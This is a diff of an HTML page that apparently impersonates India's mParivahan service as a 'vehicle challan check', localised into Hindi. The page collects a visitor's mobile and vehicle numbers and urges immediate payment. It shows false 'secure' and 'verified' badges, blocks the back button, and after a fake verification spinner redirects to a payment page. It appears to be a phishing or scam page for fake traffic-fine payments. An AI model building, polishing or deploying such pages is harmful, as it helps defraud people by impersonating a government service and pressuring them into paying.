@@ -1,29 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>mParivahan – Vehicle Verification</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>वाहन सत्यापन - mParivahan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow-x: hidden;
-      position: fixed;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     
     body {
+      font-family: 'Poppins', sans-serif;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      font-family: 'Poppins', sans-serif;
-      overflow-y: auto;
-      -webkit-overflow-scrolling: touch;
       padding: 20px;
+      position: fixed;
+      overflow-y: auto;
     }
     
     .container {
@@ -31,84 +25,135 @@
       border-radius: 24px;
       padding: 30px 25px;
       width: 100%;
-      max-width: 360px;
+      max-width: 380px;
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-      text-align: center;
       animation: slideUp 0.6s ease-out;
-      margin: 20px auto;
-      box-sizing: border-box;
     }
     
-    .logo {
-      font-size: clamp(32px, 9vw, 40px);
-      font-weight: 700;
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    
+    .logo-icon {
+      font-size: 60px;
+      margin-bottom: 10px;
+    }
+    
+    .title {
+      font-size: 28px;
+      font-weight: 900;
       background: linear-gradient(135deg, #667eea, #764ba2);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-      margin-bottom: 8px;
+      margin-bottom: 5px;
     }
     
-    .welcome-text {
-      font-size: clamp(14px, 4vw, 16px);
+    .subtitle {
+      font-size: 14px;
       color: #666;
-      margin-bottom: 25px;
-      font-weight: 500;
+      font-weight: 600;
+    }
+    
+    .info-card {
+      background: linear-gradient(135deg, #fff7ed, #fef3c7);
+      border-left: 4px solid #f59e0b;
+      padding: 12px 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 12px;
+      color: #92400e;
+      font-weight: 600;
+      line-height: 1.5;
     }
     
     .form-group {
-      margin-bottom: 18px;
+      margin-bottom: 16px;
     }
     
-    .form-group input {
+    .label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 8px;
+      text-align: left;
+    }
+    
+    input {
       width: 100%;
       padding: 14px 16px;
-      border: 2px solid #f0f0f0;
+      border: 2px solid #e5e7eb;
       border-radius: 14px;
       font-size: 15px;
-      text-align: center;
+      font-weight: 600;
       transition: all 0.3s ease;
-      background: #fafafa;
-      font-weight: 500;
+      background: #f9fafb;
+      color: #1f2937;
       box-sizing: border-box;
+      text-align: center;
     }
     
-    .form-group input:focus {
+    input:focus {
       outline: none;
       border-color: #667eea;
-      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-      background: #fff;
+      background: white;
+      box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
     }
     
-    .register-btn {
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      color: #fff;
-      border: none;
-      padding: 14px;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: 700;
+    input::placeholder {
+      color: #9ca3af;
+    }
+    
+    .format-hint {
+      font-size: 10px;
+      color: #6b7280;
+      margin-top: 5px;
+      text-align: left;
+    }
+    
+    .verify-btn {
       width: 100%;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 700;
       cursor: pointer;
-      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
       text-transform: uppercase;
       letter-spacing: 1px;
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+      transition: all 0.3s ease;
+      margin-top: 10px;
+    }
+    
+    .verify-btn:active {
+      transform: scale(0.98);
     }
     
     .features {
-      margin-top: 20px;
       display: flex;
-      justify-content: center;
-      gap: 12px;
-      flex-wrap: wrap;
+      justify-content: space-around;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #e5e7eb;
     }
     
-    .feature-badge {
-      background: linear-gradient(135deg, #e0e7ff, #ddd6fe);
-      padding: 6px 12px;
-      border-radius: 16px;
-      font-size: 11px;
-      color: #4c1d95;
+    .feature {
+      text-align: center;
+    }
+    
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 5px;
+    }
+    
+    .feature-text {
+      font-size: 10px;
+      color: #6b7280;
       font-weight: 600;
     }
     
@@ -138,7 +183,7 @@
     }
     
     .loading-text {
-      font-size: 14px;
+      font-size: 15px;
       color: #667eea;
       font-weight: 600;
     }
@@ -155,29 +200,64 @@
 </head>
 <body>
   <div class="container">
-    <div class="logo">mParivahan</div>
-    <div class="welcome-text">🚗 Check Your Vehicle Challan</div>
-    
-    <div class="form-group">
-      <input type="tel" placeholder="📱 Enter Mobile Number" id="mobile" required maxlength="10" />
+    <div class="header">
+      <div class="logo-icon">🚗</div>
+      <h1 class="title">वाहन सत्यापन</h1>
+      <p class="subtitle">Vehicle Verification</p>
     </div>
     
-    <div class="form-group">
-      <input type="text" placeholder="🚗 Enter Vehicle Number" id="vehicle" required maxlength="10" />
+    <div class="info-card">
+      ⚠️ अपने वाहन के चालान की जांच करें और तुरंत भुगतान करें
     </div>
     
-    <button class="register-btn" id="registerBtn">Check Challan</button>
+    <form id="verifyForm">
+      <div class="form-group">
+        <label class="label">📱 मोबाइल नंबर</label>
+        <input 
+          type="tel" 
+          id="mobile" 
+          placeholder="10-Digit Mobile Number"
+          maxlength="10"
+          required
+        />
+        <div class="format-hint">भारतीय मोबाइल नंबर (6-9 से शुरू)</div>
+      </div>
+      
+      <div class="form-group">
+        <label class="label">🚗 वाहन नंबर</label>
+        <input 
+          type="text" 
+          id="vehicle" 
+          placeholder="DL01AB1234"
+          maxlength="10"
+          required
+        />
+        <div class="format-hint">उदाहरण: DL01AB1234, MH02CD5678</div>
+      </div>
+      
+      <button type="submit" class="verify-btn">
+        चालान जांचें
+      </button>
+    </form>
     
     <div class="features">
-      <div class="feature-badge">⚡ Instant</div>
-      <div class="feature-badge">🔒 Secure</div>
-      <div class="feature-badge">✅ Verified</div>
-      <div class="feature-badge">🏛️ Official</div>
+      <div class="feature">
+        <div class="feature-icon">⚡</div>
+        <div class="feature-text">तत्काल</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🔒</div>
+        <div class="feature-text">सुरक्षित</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">✅</div>
+        <div class="feature-text">सत्यापित</div>
+      </div>
     </div>
     
     <div class="overlay" id="loadingOverlay">
       <div class="spinner"></div>
-      <p class="loading-text">Verifying vehicle details...</p>
+      <p class="loading-text">वाहन विवरण सत्यापित किया जा रहा है...</p>
     </div>
   </div>
 
@@ -188,38 +268,37 @@
       history.go(1);
     };
     
+    // Mobile validation (Indian format)
     const mobileInput = document.getElementById('mobile');
     mobileInput.addEventListener('input', function(e) {
       this.value = this.value.replace(/[^0-9]/g, '').substring(0, 10);
     });
     
+    // Vehicle number formatting
     const vehicleInput = document.getElementById('vehicle');
     vehicleInput.addEventListener('input', function(e) {
       this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '').substring(0, 10);
     });
-
-    document.getElementById('registerBtn').addEventListener('click', function() {
-      const mobile = document.getElementById('mobile').value.trim();
-      const vehicle = document.getElementById('vehicle').value.trim();
+    
+    document.getElementById('verifyForm').addEventListener('submit', function(e) {
+      e.preventDefault();
       
-      if (!mobile || mobile.length < 10) {
-        alert('⚠️ Please enter a valid 10-digit mobile number.');
+      const mobile = mobileInput.value.trim();
+      const vehicle = vehicleInput.value.trim();
+      
+      // Indian mobile validation (starts with 6-9, 10 digits)
+      if (!/^[6-9]\d{9}$/.test(mobile)) {
+        alert('⚠️ कृपया वैध भारतीय मोबाइल नंबर दर्ज करें (10 अंक, 6-9 से शुरू)');
         return;
       }
       
-      // Indian mobile validation
-      if (!/^[6-9]/.test(mobile)) {
-        alert('⚠️ Please enter a valid Indian mobile number (starting with 6-9).');
-        return;
-      }
-      
-      if (!vehicle || vehicle.length < 8) {
-        alert('⚠️ Please enter a valid vehicle number (e.g., DL01AB1234).');
+      // Vehicle number validation (Indian format)
+      if (vehicle.length < 8 || vehicle.length > 10) {
+        alert('⚠️ कृपया वैध वाहन नंबर दर्ज करें (जैसे: DL01AB1234)');
         return;
       }
       
       document.getElementById('loadingOverlay').style.display = 'flex';
-      this.disabled = true;
       
       setTimeout(() => {
         window.location.href = 'payment.html';
